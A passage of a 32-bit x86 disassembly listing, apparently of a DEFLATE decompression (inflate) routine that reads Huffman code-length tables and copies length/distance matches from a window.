   1c2af:	push   DWORD PTR [ebp-0x4]
   1c2b2:	push   DWORD PTR [ebp-0x18]
   1c2b5:	call   0x1dade
   1c2ba:	mov    eax,DWORD PTR [ebp-0xc]
   1c2bd:	sub    DWORD PTR [ebp-0x8],eax
   1c2c0:	add    DWORD PTR [ebp-0x4],eax
   1c2c3:	sub    DWORD PTR [ebp-0x14],eax
   1c2c6:	add    DWORD PTR [ebp-0x18],eax
   1c2c9:	add    esp,0xc
   1c2cc:	sub    DWORD PTR [esi+0x40],eax
   1c2cf:	jmp    0x1cb77
   1c2d4:	cmp    edi,0xe
   1c2d7:	jae    0x1c300
   1c2d9:	cmp    DWORD PTR [ebp-0x8],0x0
   1c2dd:	je     0x1cbc5
   1c2e3:	mov    eax,DWORD PTR [ebp-0x4]
   1c2e6:	movzx  eax,BYTE PTR [eax]
   1c2e9:	dec    DWORD PTR [ebp-0x8]
   1c2ec:	mov    ecx,edi
   1c2ee:	shl    eax,cl
   1c2f0:	add    edi,0x8
   1c2f3:	add    ebx,eax
   1c2f5:	inc    DWORD PTR [ebp-0x4]
   1c2f8:	cmp    edi,0xe
   1c2fb:	jb     0x1c2d9
   1c2fd:	mov    edx,DWORD PTR [ebp+0x8]
   1c300:	mov    eax,ebx
   1c302:	and    eax,0x1f
   1c305:	add    eax,0x101
   1c30a:	mov    DWORD PTR [esi+0x60],eax
   1c30d:	shr    ebx,0x5
   1c310:	mov    eax,ebx
   1c312:	and    eax,0x1f
   1c315:	inc    eax
   1c316:	shr    ebx,0x5
   1c319:	mov    DWORD PTR [esi+0x64],eax
   1c31c:	mov    eax,ebx
   1c31e:	and    eax,0xf
   1c321:	add    eax,0x4
   1c324:	shr    ebx,0x4
   1c327:	sub    edi,0xe
   1c32a:	cmp    DWORD PTR [esi+0x60],0x11e
   1c331:	mov    DWORD PTR [esi+0x5c],eax
   1c334:	ja     0x1c348
   1c336:	cmp    DWORD PTR [esi+0x64],0x1e
   1c33a:	ja     0x1c348
   1c33c:	and    DWORD PTR [esi+0x68],0x0
   1c340:	mov    DWORD PTR [esi],0x10
   1c346:	jmp    0x1c396
   1c348:	mov    DWORD PTR [edx+0x18],0x1ed74
   1c34f:	jmp    0x1cb71
   1c354:	cmp    DWORD PTR [ebp-0x8],0x0
   1c358:	je     0x1cbc5
   1c35e:	mov    eax,DWORD PTR [ebp-0x4]
   1c361:	movzx  eax,BYTE PTR [eax]
   1c364:	dec    DWORD PTR [ebp-0x8]
   1c367:	mov    ecx,edi
   1c369:	shl    eax,cl
   1c36b:	add    ebx,eax
   1c36d:	inc    DWORD PTR [ebp-0x4]
   1c370:	add    edi,0x8
   1c373:	cmp    edi,0x3
   1c376:	jb     0x1c354
   1c378:	mov    ecx,DWORD PTR [esi+0x68]
   1c37b:	movzx  ecx,WORD PTR [ecx*2+0x7bc90]
   1c383:	mov    eax,ebx
   1c385:	and    eax,0x7
   1c388:	mov    WORD PTR [esi+ecx*2+0x70],ax
   1c38d:	inc    DWORD PTR [esi+0x68]
   1c390:	shr    ebx,0x3
   1c393:	sub    edi,0x3
   1c396:	mov    eax,DWORD PTR [esi+0x68]
   1c399:	cmp    eax,DWORD PTR [esi+0x5c]
   1c39c:	jb     0x1c373
   1c39e:	jmp    0x1c3b5
   1c3a0:	mov    eax,DWORD PTR [esi+0x68]
   1c3a3:	movzx  eax,WORD PTR [eax*2+0x7bc90]
   1c3ab:	xor    ecx,ecx
   1c3ad:	mov    WORD PTR [esi+eax*2+0x70],cx
   1c3b2:	inc    DWORD PTR [esi+0x68]
   1c3b5:	cmp    DWORD PTR [esi+0x68],0x13
   1c3b9:	jb     0x1c3a0
   1c3bb:	lea    eax,[esi+0x530]
   1c3c1:	lea    ecx,[esi+0x6c]
   1c3c4:	mov    DWORD PTR [ecx],eax
   1c3c6:	mov    DWORD PTR [esi+0x4c],eax
   1c3c9:	lea    edx,[esi+0x2f0]
   1c3cf:	push   edx
   1c3d0:	lea    eax,[esi+0x54]
   1c3d3:	push   eax
   1c3d4:	push   ecx
   1c3d5:	mov    DWORD PTR [eax],0x7
   1c3db:	push   0x13
   1c3dd:	lea    eax,[esi+0x70]
   1c3e0:	push   eax
   1c3e1:	push   0x0
   1c3e3:	call   0x1d180
   1c3e8:	mov    DWORD PTR [ebp-0x24],eax
   1c3eb:	test   eax,eax
   1c3ed:	je     0x1c3fe
   1c3ef:	mov    eax,DWORD PTR [ebp+0x8]
   1c3f2:	mov    DWORD PTR [eax+0x18],0x1ed5a
   1c3f9:	jmp    0x1cb71
   1c3fe:	and    DWORD PTR [esi+0x68],0x0
   1c402:	mov    DWORD PTR [esi],0x11
   1c408:	jmp    0x1c604
   1c40d:	cmp    DWORD PTR [ebp-0x8],0x0
   1c411:	je     0x1cbc5
   1c417:	mov    eax,DWORD PTR [ebp-0x4]
   1c41a:	movzx  eax,BYTE PTR [eax]
   1c41d:	dec    DWORD PTR [ebp-0x8]
   1c420:	mov    ecx,edi
   1c422:	shl    eax,cl
   1c424:	add    ebx,eax
   1c426:	inc    DWORD PTR [ebp-0x4]
   1c429:	add    edi,0x8
   1c42c:	mov    ecx,DWORD PTR [esi+0x54]
   1c42f:	xor    eax,eax
   1c431:	inc    eax
   1c432:	shl    eax,cl
   1c434:	mov    ecx,DWORD PTR [esi+0x4c]
   1c437:	dec    eax
   1c438:	and    eax,ebx
   1c43a:	mov    eax,DWORD PTR [ecx+eax*4]
   1c43d:	mov    ecx,eax
   1c43f:	shr    ecx,0x8
   1c442:	movzx  ecx,cl
   1c445:	mov    DWORD PTR [ebp-0x20],eax
   1c448:	cmp    ecx,edi
   1c44a:	ja     0x1c40d
   1c44c:	mov    ecx,eax
   1c44e:	shr    ecx,0x10
   1c451:	cmp    cx,0x10
   1c455:	jae    0x1c4a2
   1c457:	mov    ecx,eax
   1c459:	shr    ecx,0x8
   1c45c:	movzx  ecx,cl
   1c45f:	jmp    0x1c483
   1c461:	cmp    DWORD PTR [ebp-0x8],0x0
   1c465:	je     0x1cbc5
   1c46b:	mov    ecx,DWORD PTR [ebp-0x4]
   1c46e:	movzx  edx,BYTE PTR [ecx]
   1c471:	dec    DWORD PTR [ebp-0x8]
   1c474:	mov    ecx,edi
   1c476:	shl    edx,cl
   1c478:	movzx  ecx,ah
   1c47b:	add    ebx,edx
   1c47d:	inc    DWORD PTR [ebp-0x4]
   1c480:	add    edi,0x8
   1c483:	cmp    edi,ecx
   1c485:	jb     0x1c461
   1c487:	movzx  ecx,ah
   1c48a:	mov    eax,DWORD PTR [esi+0x68]
   1c48d:	shr    ebx,cl
   1c48f:	sub    edi,ecx
   1c491:	mov    cx,WORD PTR [ebp-0x1e]
   1c495:	mov    WORD PTR [esi+eax*2+0x70],cx
   1c49a:	inc    DWORD PTR [esi+0x68]
   1c49d:	jmp    0x1c604
   1c4a2:	cmp    WORD PTR [ebp-0x1e],0x10
   1c4a7:	jne    0x1c4ff
   1c4a9:	movzx  eax,ah
   1c4ac:	jmp    0x1c4cd
   1c4ae:	cmp    DWORD PTR [ebp-0x8],0x0
   1c4b2:	je     0x1cbc5
   1c4b8:	mov    ecx,DWORD PTR [ebp-0x4]
   1c4bb:	movzx  edx,BYTE PTR [ecx]
   1c4be:	dec    DWORD PTR [ebp-0x8]
   1c4c1:	mov    ecx,edi
   1c4c3:	shl    edx,cl
   1c4c5:	add    ebx,edx
   1c4c7:	inc    DWORD PTR [ebp-0x4]
   1c4ca:	add    edi,0x8
   1c4cd:	lea    ecx,[eax+0x2]
   1c4d0:	cmp    edi,ecx
   1c4d2:	jb     0x1c4ae
   1c4d4:	mov    ecx,eax
   1c4d6:	sub    edi,eax
   1c4d8:	mov    eax,DWORD PTR [esi+0x68]
   1c4db:	shr    ebx,cl
   1c4dd:	test   eax,eax
   1c4df:	je     0x1c615
   1c4e5:	movzx  eax,WORD PTR [esi+eax*2+0x6e]
   1c4ea:	mov    DWORD PTR [ebp-0x20],eax
   1c4ed:	mov    eax,ebx
   1c4ef:	and    eax,0x3
   1c4f2:	add    eax,0x3
   1c4f5:	shr    ebx,0x2
   1c4f8:	dec    edi
   1c4f9:	dec    edi
   1c4fa:	jmp    0x1c584
   1c4ff:	cmp    WORD PTR [ebp-0x1e],0x11
   1c504:	movzx  edx,ah
   1c507:	jne    0x1c563
   1c509:	jmp    0x1c52a
   1c50b:	cmp    DWORD PTR [ebp-0x8],0x0
   1c50f:	je     0x1cbc5
   1c515:	mov    eax,DWORD PTR [ebp-0x4]
   1c518:	movzx  eax,BYTE PTR [eax]
   1c51b:	dec    DWORD PTR [ebp-0x8]
   1c51e:	mov    ecx,edi
   1c520:	shl    eax,cl
   1c522:	add    ebx,eax
   1c524:	inc    DWORD PTR [ebp-0x4]
   1c527:	add    edi,0x8
   1c52a:	lea    eax,[edx+0x3]
   1c52d:	cmp    edi,eax
   1c52f:	jb     0x1c50b
   1c531:	mov    ecx,edx
   1c533:	shr    ebx,cl
   1c535:	push   0xfffffffd
   1c537:	mov    eax,ebx
   1c539:	and    eax,0x7
   1c53c:	add    eax,0x3
   1c53f:	shr    ebx,0x3
   1c542:	jmp    0x1c57b
   1c544:	cmp    DWORD PTR [ebp-0x8],0x0
   1c548:	je     0x1cbc5
   1c54e:	mov    eax,DWORD PTR [ebp-0x4]
   1c551:	movzx  eax,BYTE PTR [eax]
   1c554:	dec    DWORD PTR [ebp-0x8]
   1c557:	mov    ecx,edi
   1c559:	shl    eax,cl
   1c55b:	add    ebx,eax
   1c55d:	inc    DWORD PTR [ebp-0x4]
   1c560:	add    edi,0x8
   1c563:	lea    eax,[edx+0x7]
   1c566:	cmp    edi,eax
   1c568:	jb     0x1c544
   1c56a:	mov    ecx,edx
   1c56c:	shr    ebx,cl
   1c56e:	push   0xfffffff9
   1c570:	mov    eax,ebx
   1c572:	and    eax,0x7f
   1c575:	add    eax,0xb
   1c578:	shr    ebx,0x7
   1c57b:	and    DWORD PTR [ebp-0x20],0x0
   1c57f:	pop    ecx
   1c580:	sub    ecx,edx
   1c582:	add    edi,ecx
   1c584:	mov    ecx,DWORD PTR [esi+0x64]
   1c587:	mov    edx,DWORD PTR [esi+0x68]
   1c58a:	add    ecx,DWORD PTR [esi+0x60]
   1c58d:	add    edx,eax
   1c58f:	cmp    edx,ecx
   1c591:	jbe    0x1c600
   1c593:	mov    eax,DWORD PTR [ebp+0x8]
   1c596:	mov    DWORD PTR [eax+0x18],0x1ed40
   1c59d:	mov    DWORD PTR [esi],0x1b
   1c5a3:	cmp    DWORD PTR [esi],0x1b
   1c5a6:	je     0x1cb77
   1c5ac:	lea    eax,[esi+0x530]
   1c5b2:	lea    ecx,[esi+0x6c]
   1c5b5:	mov    DWORD PTR [ecx],eax
   1c5b7:	mov    DWORD PTR [esi+0x4c],eax
   1c5ba:	lea    edx,[esi+0x2f0]
   1c5c0:	push   edx
   1c5c1:	lea    eax,[esi+0x54]
   1c5c4:	push   eax
   1c5c5:	push   ecx
   1c5c6:	push   DWORD PTR [esi+0x60]
   1c5c9:	mov    DWORD PTR [eax],0x9
   1c5cf:	lea    eax,[esi+0x70]
   1c5d2:	push   eax
   1c5d3:	push   0x1
   1c5d5:	call   0x1d180
   1c5da:	mov    DWORD PTR [ebp-0x24],eax
   1c5dd:	test   eax,eax
   1c5df:	je     0x1c624
   1c5e1:	mov    eax,DWORD PTR [ebp+0x8]
   1c5e4:	mov    DWORD PTR [eax+0x18],0x1ed24
   1c5eb:	jmp    0x1cb71
   1c5f0:	mov    ecx,DWORD PTR [esi+0x68]
   1c5f3:	mov    dx,WORD PTR [ebp-0x20]
   1c5f7:	dec    eax
   1c5f8:	mov    WORD PTR [esi+ecx*2+0x70],dx
   1c5fd:	inc    DWORD PTR [esi+0x68]
   1c600:	test   eax,eax
   1c602:	jne    0x1c5f0
   1c604:	mov    eax,DWORD PTR [esi+0x64]
   1c607:	add    eax,DWORD PTR [esi+0x60]
   1c60a:	cmp    DWORD PTR [esi+0x68],eax
   1c60d:	jb     0x1c42c
   1c613:	jmp    0x1c5a3
   1c615:	mov    eax,DWORD PTR [ebp+0x8]
   1c618:	mov    DWORD PTR [eax+0x18],0x1ed40
   1c61f:	jmp    0x1cb71
   1c624:	lea    ecx,[esi+0x6c]
   1c627:	mov    eax,DWORD PTR [ecx]
   1c629:	mov    DWORD PTR [esi+0x50],eax
   1c62c:	lea    edx,[esi+0x2f0]
   1c632:	push   edx
   1c633:	lea    eax,[esi+0x58]
   1c636:	push   eax
   1c637:	push   ecx
   1c638:	push   DWORD PTR [esi+0x64]
   1c63b:	mov    DWORD PTR [eax],0x6
   1c641:	mov    eax,DWORD PTR [esi+0x60]
   1c644:	lea    eax,[esi+eax*2+0x70]
   1c648:	push   eax
   1c649:	push   0x2
   1c64b:	call   0x1d180
   1c650:	mov    DWORD PTR [ebp-0x24],eax
   1c653:	test   eax,eax
   1c655:	je     0x1c666
   1c657:	mov    eax,DWORD PTR [ebp+0x8]
   1c65a:	mov    DWORD PTR [eax+0x18],0x1ed0e
   1c661:	jmp    0x1cb71
   1c666:	mov    DWORD PTR [esi],0x12
   1c66c:	cmp    DWORD PTR [ebp-0x8],0x6
   1c670:	jb     0x1c6c9
   1c672:	cmp    DWORD PTR [ebp-0x14],0x102
   1c679:	jb     0x1c6c9
   1c67b:	mov    eax,DWORD PTR [ebp+0x8]
   1c67e:	mov    ecx,DWORD PTR [ebp-0x18]
   1c681:	push   DWORD PTR [ebp-0x1c]
   1c684:	mov    DWORD PTR [eax+0xc],ecx
   1c687:	mov    ecx,DWORD PTR [ebp-0x14]
   1c68a:	mov    DWORD PTR [eax+0x10],ecx
   1c68d:	mov    ecx,DWORD PTR [ebp-0x4]
   1c690:	mov    DWORD PTR [eax],ecx
   1c692:	mov    ecx,DWORD PTR [ebp-0x8]
   1c695:	mov    DWORD PTR [eax+0x4],ecx
   1c698:	push   eax
   1c699:	mov    DWORD PTR [esi+0x38],ebx
   1c69c:	mov    DWORD PTR [esi+0x3c],edi
   1c69f:	call   0x1cd9a
   1c6a4:	mov    eax,DWORD PTR [ebp+0x8]
   1c6a7:	mov    ecx,DWORD PTR [eax+0xc]
   1c6aa:	mov    ebx,DWORD PTR [esi+0x38]
   1c6ad:	mov    edi,DWORD PTR [esi+0x3c]
   1c6b0:	mov    DWORD PTR [ebp-0x18],ecx
   1c6b3:	mov    ecx,DWORD PTR [eax+0x10]
   1c6b6:	mov    DWORD PTR [ebp-0x14],ecx
   1c6b9:	mov    ecx,DWORD PTR [eax]
   1c6bb:	mov    eax,DWORD PTR [eax+0x4]
   1c6be:	mov    DWORD PTR [ebp-0x4],ecx
   1c6c1:	mov    DWORD PTR [ebp-0x8],eax
   1c6c4:	jmp    0x1cb77
   1c6c9:	mov    ecx,DWORD PTR [esi+0x54]
   1c6cc:	mov    eax,DWORD PTR [esi+0x4c]
   1c6cf:	xor    edx,edx
   1c6d1:	inc    edx
   1c6d2:	shl    edx,cl
   1c6d4:	dec    edx
   1c6d5:	and    edx,ebx
   1c6d7:	mov    eax,DWORD PTR [eax+edx*4]
   1c6da:	jmp    0x1c70c
   1c6dc:	cmp    DWORD PTR [ebp-0x8],0x0
   1c6e0:	je     0x1cbc5
   1c6e6:	mov    eax,DWORD PTR [ebp-0x4]
   1c6e9:	movzx  eax,BYTE PTR [eax]
   1c6ec:	dec    DWORD PTR [ebp-0x8]
   1c6ef:	mov    ecx,edi
   1c6f1:	shl    eax,cl
   1c6f3:	mov    ecx,DWORD PTR [esi+0x54]
   1c6f6:	add    edi,0x8
   1c6f9:	add    ebx,eax
   1c6fb:	inc    DWORD PTR [ebp-0x4]
   1c6fe:	xor    eax,eax
   1c700:	inc    eax
   1c701:	shl    eax,cl
   1c703:	mov    ecx,DWORD PTR [esi+0x4c]
   1c706:	dec    eax
   1c707:	and    eax,ebx
   1c709:	mov    eax,DWORD PTR [ecx+eax*4]
   1c70c:	mov    ecx,eax
   1c70e:	shr    ecx,0x8
   1c711:	movzx  ecx,cl
   1c714:	cmp    ecx,edi
   1c716:	ja     0x1c6dc
   1c718:	test   al,al
   1c71a:	je     0x1c7b3
   1c720:	test   al,0xf0
   1c722:	jne    0x1c7b3
   1c728:	mov    DWORD PTR [ebp-0xc],eax
   1c72b:	shr    DWORD PTR [ebp-0xc],0x8
   1c72f:	movzx  edx,BYTE PTR [ebp-0xc]
   1c733:	mov    DWORD PTR [ebp-0x28],edx
   1c736:	movzx  ecx,al
   1c739:	add    ecx,edx
   1c73b:	xor    edx,edx
   1c73d:	inc    edx
   1c73e:	shl    edx,cl
   1c740:	mov    ecx,DWORD PTR [ebp-0x28]
   1c743:	mov    DWORD PTR [ebp-0x20],eax
   1c746:	shr    eax,0x10
   1c749:	dec    edx
   1c74a:	and    edx,ebx
   1c74c:	shr    edx,cl
   1c74e:	add    edx,eax
   1c750:	mov    eax,DWORD PTR [esi+0x4c]
   1c753:	mov    eax,DWORD PTR [eax+edx*4]
   1c756:	movzx  edx,BYTE PTR [ebp-0xc]
   1c75a:	jmp    0x1c79d
   1c75c:	cmp    DWORD PTR [ebp-0x8],0x0
   1c760:	je     0x1cbc5
   1c766:	mov    eax,DWORD PTR [ebp-0x4]
   1c769:	movzx  eax,BYTE PTR [eax]
   1c76c:	movzx  edx,BYTE PTR [ebp-0x1f]
   1c770:	dec    DWORD PTR [ebp-0x8]
   1c773:	mov    ecx,edi
   1c775:	shl    eax,cl
   1c777:	movzx  ecx,BYTE PTR [ebp-0x20]
   1c77b:	add    ebx,eax
   1c77d:	inc    DWORD PTR [ebp-0x4]
   1c780:	xor    eax,eax
   1c782:	add    ecx,edx
   1c784:	inc    eax
   1c785:	shl    eax,cl
   1c787:	add    edi,0x8
   1c78a:	mov    ecx,edx
   1c78c:	dec    eax
   1c78d:	and    eax,ebx
   1c78f:	shr    eax,cl
   1c791:	movzx  ecx,WORD PTR [ebp-0x1e]
   1c795:	add    eax,ecx
   1c797:	mov    ecx,DWORD PTR [esi+0x4c]
   1c79a:	mov    eax,DWORD PTR [ecx+eax*4]
   1c79d:	mov    ecx,eax
   1c79f:	shr    ecx,0x8
   1c7a2:	movzx  ecx,cl
   1c7a5:	add    ecx,edx
   1c7a7:	cmp    ecx,edi
   1c7a9:	ja     0x1c75c
   1c7ab:	movzx  ecx,BYTE PTR [ebp-0x1f]
   1c7af:	shr    ebx,cl
   1c7b1:	sub    edi,ecx
   1c7b3:	mov    ecx,eax
   1c7b5:	shr    ecx,0x8
   1c7b8:	movzx  ecx,cl
   1c7bb:	shr    ebx,cl
   1c7bd:	sub    edi,ecx
   1c7bf:	mov    ecx,eax
   1c7c1:	shr    ecx,0x10
   1c7c4:	mov    DWORD PTR [esi+0x40],ecx
   1c7c7:	test   al,al
   1c7c9:	jne    0x1c7d6
   1c7cb:	mov    DWORD PTR [esi],0x17
   1c7d1:	jmp    0x1cb77
   1c7d6:	test   al,0x20
   1c7d8:	je     0x1c7e5
   1c7da:	mov    DWORD PTR [esi],0xb
   1c7e0:	jmp    0x1cb77
   1c7e5:	test   al,0x40
   1c7e7:	je     0x1c7f8
   1c7e9:	mov    eax,DWORD PTR [ebp+0x8]
   1c7ec:	mov    DWORD PTR [eax+0x18],0x1ecf2
   1c7f3:	jmp    0x1cb71
   1c7f8:	movzx  eax,al
   1c7fb:	and    eax,0xf
   1c7fe:	mov    DWORD PTR [esi+0x48],eax
   1c801:	mov    DWORD PTR [esi],0x13
   1c807:	mov    eax,DWORD PTR [esi+0x48]
   1c80a:	test   eax,eax
   1c80c:	je     0x1c847
   1c80e:	cmp    edi,eax
   1c810:	jae    0x1c836
   1c812:	cmp    DWORD PTR [ebp-0x8],0x0
   1c816:	je     0x1cbc5
   1c81c:	mov    ecx,DWORD PTR [ebp-0x4]
   1c81f:	movzx  edx,BYTE PTR [ecx]
   1c822:	dec    DWORD PTR [ebp-0x8]
   1c825:	mov    ecx,edi
   1c827:	shl    edx,cl
   1c829:	add    edi,0x8
   1c82c:	add    ebx,edx
   1c82e:	inc    DWORD PTR [ebp-0x4]
   1c831:	cmp    edi,DWORD PTR [esi+0x48]
   1c834:	jb     0x1c812
   1c836:	xor    edx,edx
   1c838:	inc    edx
   1c839:	mov    ecx,eax
   1c83b:	shl    edx,cl
   1c83d:	dec    edx
   1c83e:	and    edx,ebx
   1c840:	add    DWORD PTR [esi+0x40],edx
   1c843:	shr    ebx,cl
   1c845:	sub    edi,eax
   1c847:	mov    DWORD PTR [esi],0x14
   1c84d:	mov    ecx,DWORD PTR [esi+0x58]
   1c850:	mov    eax,DWORD PTR [esi+0x50]
   1c853:	xor    edx,edx
   1c855:	inc    edx
   1c856:	shl    edx,cl
   1c858:	dec    edx
   1c859:	and    edx,ebx
   1c85b:	mov    eax,DWORD PTR [eax+edx*4]
   1c85e:	jmp    0x1c890
   1c860:	cmp    DWORD PTR [ebp-0x8],0x0
   1c864:	je     0x1cbc5
   1c86a:	mov    eax,DWORD PTR [ebp-0x4]
   1c86d:	movzx  eax,BYTE PTR [eax]
   1c870:	dec    DWORD PTR [ebp-0x8]
   1c873:	mov    ecx,edi
   1c875:	shl    eax,cl
   1c877:	mov    ecx,DWORD PTR [esi+0x58]
   1c87a:	add    edi,0x8
   1c87d:	add    ebx,eax
   1c87f:	inc    DWORD PTR [ebp-0x4]
   1c882:	xor    eax,eax
   1c884:	inc    eax
   1c885:	shl    eax,cl
   1c887:	mov    ecx,DWORD PTR [esi+0x50]
   1c88a:	dec    eax
   1c88b:	and    eax,ebx
   1c88d:	mov    eax,DWORD PTR [ecx+eax*4]
   1c890:	mov    ecx,eax
   1c892:	shr    ecx,0x8
   1c895:	movzx  ecx,cl
   1c898:	cmp    ecx,edi
   1c89a:	ja     0x1c860
   1c89c:	test   al,0xf0
   1c89e:	jne    0x1c92f
   1c8a4:	mov    DWORD PTR [ebp-0xc],eax
   1c8a7:	shr    DWORD PTR [ebp-0xc],0x8
   1c8ab:	movzx  edx,BYTE PTR [ebp-0xc]
   1c8af:	mov    DWORD PTR [ebp-0x28],edx
   1c8b2:	movzx  ecx,al
   1c8b5:	add    ecx,edx
   1c8b7:	xor    edx,edx
   1c8b9:	inc    edx
   1c8ba:	shl    edx,cl
   1c8bc:	mov    ecx,DWORD PTR [ebp-0x28]
   1c8bf:	mov    DWORD PTR [ebp-0x20],eax
   1c8c2:	shr    eax,0x10
   1c8c5:	dec    edx
   1c8c6:	and    edx,ebx
   1c8c8:	shr    edx,cl
   1c8ca:	add    edx,eax
   1c8cc:	mov    eax,DWORD PTR [esi+0x50]
   1c8cf:	mov    eax,DWORD PTR [eax+edx*4]
   1c8d2:	movzx  edx,BYTE PTR [ebp-0xc]
   1c8d6:	jmp    0x1c919
   1c8d8:	cmp    DWORD PTR [ebp-0x8],0x0
   1c8dc:	je     0x1cbc5
   1c8e2:	mov    eax,DWORD PTR [ebp-0x4]
   1c8e5:	movzx  eax,BYTE PTR [eax]
   1c8e8:	movzx  edx,BYTE PTR [ebp-0x1f]
   1c8ec:	dec    DWORD PTR [ebp-0x8]
   1c8ef:	mov    ecx,edi
   1c8f1:	shl    eax,cl
   1c8f3:	movzx  ecx,BYTE PTR [ebp-0x20]
   1c8f7:	add    ebx,eax
   1c8f9:	inc    DWORD PTR [ebp-0x4]
   1c8fc:	xor    eax,eax
   1c8fe:	add    ecx,edx
   1c900:	inc    eax
   1c901:	shl    eax,cl
   1c903:	add    edi,0x8
   1c906:	mov    ecx,edx
   1c908:	dec    eax
   1c909:	and    eax,ebx
   1c90b:	shr    eax,cl
   1c90d:	movzx  ecx,WORD PTR [ebp-0x1e]
   1c911:	add    eax,ecx
   1c913:	mov    ecx,DWORD PTR [esi+0x50]
   1c916:	mov    eax,DWORD PTR [ecx+eax*4]
   1c919:	mov    ecx,eax
   1c91b:	shr    ecx,0x8
   1c91e:	movzx  ecx,cl
   1c921:	add    ecx,edx
   1c923:	cmp    ecx,edi
   1c925:	ja     0x1c8d8
   1c927:	movzx  ecx,BYTE PTR [ebp-0x1f]
   1c92b:	shr    ebx,cl
   1c92d:	sub    edi,ecx
   1c92f:	mov    ecx,eax
   1c931:	shr    ecx,0x8
   1c934:	movzx  ecx,cl
   1c937:	shr    ebx,cl
   1c939:	sub    edi,ecx
   1c93b:	test   al,0x40
   1c93d:	je     0x1c94e
   1c93f:	mov    eax,DWORD PTR [ebp+0x8]
   1c942:	mov    DWORD PTR [eax+0x18],0x1ecdc
   1c949:	jmp    0x1cb71
   1c94e:	mov    edx,DWORD PTR [ebp+0x8]
   1c951:	mov    ecx,eax
   1c953:	movzx  eax,al
   1c956:	shr    ecx,0x10
   1c959:	and    eax,0xf
   1c95c:	mov    DWORD PTR [esi+0x44],ecx
   1c95f:	mov    DWORD PTR [esi+0x48],eax
   1c962:	mov    DWORD PTR [esi],0x15
   1c968:	mov    eax,DWORD PTR [esi+0x48]
   1c96b:	test   eax,eax
   1c96d:	je     0x1c9ac
   1c96f:	cmp    edi,eax
   1c971:	jae    0x1c99a
   1c973:	cmp    DWORD PTR [ebp-0x8],0x0
   1c977:	je     0x1cbc5
   1c97d:	mov    eax,DWORD PTR [ebp-0x4]
   1c980:	movzx  eax,BYTE PTR [eax]
   1c983:	dec    DWORD PTR [ebp-0x8]
   1c986:	mov    ecx,edi
   1c988:	shl    eax,cl
   1c98a:	add    edi,0x8
   1c98d:	add    ebx,eax
   1c98f:	inc    DWORD PTR [ebp-0x4]
   1c992:	cmp    edi,DWORD PTR [esi+0x48]
   1c995:	jb     0x1c973
   1c997:	mov    edx,DWORD PTR [ebp+0x8]
   1c99a:	mov    ecx,DWORD PTR [esi+0x48]
   1c99d:	xor    eax,eax
   1c99f:	inc    eax
   1c9a0:	shl    eax,cl
   1c9a2:	dec    eax
   1c9a3:	and    eax,ebx
   1c9a5:	add    DWORD PTR [esi+0x44],eax
   1c9a8:	shr    ebx,cl
   1c9aa:	sub    edi,ecx
   1c9ac:	mov    eax,DWORD PTR [esi+0x2c]
   1c9af:	sub    eax,DWORD PTR [ebp-0x14]
   1c9b2:	add    eax,DWORD PTR [ebp-0x1c]
   1c9b5:	cmp    DWORD PTR [esi+0x44],eax
   1c9b8:	jbe    0x1c9c6
   1c9ba:	mov    DWORD PTR [edx+0x18],0x1ecbe
   1c9c1:	jmp    0x1cb71
   1c9c6:	mov    DWORD PTR [esi],0x16
   1c9cc:	cmp    DWORD PTR [ebp-0x14],0x0
   1c9d0:	je     0x1cbc5
   1c9d6:	mov    eax,DWORD PTR [ebp-0x1c]
   1c9d9:	sub    eax,DWORD PTR [ebp-0x14]
   1c9dc:	mov    ecx,DWORD PTR [esi+0x44]
   1c9df:	cmp    ecx,eax
   1c9e1:	jbe    0x1ca10
   1c9e3:	sub    ecx,eax
   1c9e5:	mov    eax,DWORD PTR [esi+0x34]
   1c9e8:	mov    DWORD PTR [ebp-0xc],ecx
   1c9eb:	mov    ecx,DWORD PTR [esi+0x30]
   1c9ee:	cmp    DWORD PTR [ebp-0xc],ecx
   1c9f1:	jbe    0x1c9fe
   1c9f3:	add    eax,DWORD PTR [esi+0x28]
   1c9f6:	sub    DWORD PTR [ebp-0xc],ecx
   1c9f9:	sub    eax,DWORD PTR [ebp-0xc]
   1c9fc:	jmp    0x1ca03
   1c9fe:	sub    eax,DWORD PTR [ebp-0xc]
   1ca01:	add    eax,ecx
   1ca03:	mov    ecx,DWORD PTR [esi+0x40]
   1ca06:	mov    DWORD PTR [ebp-0x28],ecx
   1ca09:	cmp    DWORD PTR [ebp-0xc],ecx
   1ca0c:	jbe    0x1ca1e
   1ca0e:	jmp    0x1ca1b
   1ca10:	mov    eax,DWORD PTR [ebp-0x18]
   1ca13:	sub    eax,ecx
   1ca15:	mov    ecx,DWORD PTR [esi+0x40]
   1ca18:	mov    DWORD PTR [ebp-0x28],ecx
   1ca1b:	mov    DWORD PTR [ebp-0xc],ecx
   1ca1e:	mov    ecx,DWORD PTR [ebp-0x14]
   1ca21:	cmp    DWORD PTR [ebp-0xc],ecx
   1ca24:	jbe    0x1ca29
   1ca26:	mov    DWORD PTR [ebp-0xc],ecx
   1ca29:	sub    ecx,DWORD PTR [ebp-0xc]
   1ca2c:	mov    DWORD PTR [ebp-0x14],ecx
   1ca2f:	mov    ecx,DWORD PTR [ebp-0x28]
   1ca32:	sub    ecx,DWORD PTR [ebp-0xc]
   1ca35:	mov    DWORD PTR [esi+0x40],ecx
   1ca38:	mov    edx,DWORD PTR [ebp-0x18]
   1ca3b:	mov    cl,BYTE PTR [eax]
   1ca3d:	inc    DWORD PTR [ebp-0x18]
   1ca40:	inc    eax
   1ca41:	dec    DWORD PTR [ebp-0xc]
   1ca44:	mov    BYTE PTR [edx],cl
   1ca46:	jne    0x1ca38
   1ca48:	cmp    DWORD PTR [esi+0x40],0x0
   1ca4c:	jne    0x1cb77
   1ca52:	jmp    0x1ca6c
   1ca54:	cmp    DWORD PTR [ebp-0x14],0x0
   1ca58:	je     0x1cbc5
   1ca5e:	mov    ecx,DWORD PTR [ebp-0x18]
   1ca61:	mov    al,BYTE PTR [esi+0x40]
   1ca64:	inc    DWORD PTR [ebp-0x18]
   1ca67:	dec    DWORD PTR [ebp-0x14]
   1ca6a:	mov    BYTE PTR [ecx],al
   1ca6c:	mov    DWORD PTR [esi],0x12
   1ca72:	jmp    0x1cb77
   1ca77:	cmp    DWORD PTR [esi+0x8],0x0
   1ca7b:	je     0x1cb2b
   1ca81:	cmp    edi,0x20
   1ca84:	jae    0x1caad
   1ca86:	cmp    DWORD PTR [ebp-0x8],0x0
   1ca8a:	je     0x1cbc5
   1ca90:	mov    eax,DWORD PTR [ebp-0x4]
   1ca93:	movzx  eax,BYTE PTR [eax]
   1ca96:	dec    DWORD PTR [ebp-0x8]
   1ca99:	mov    ecx,edi
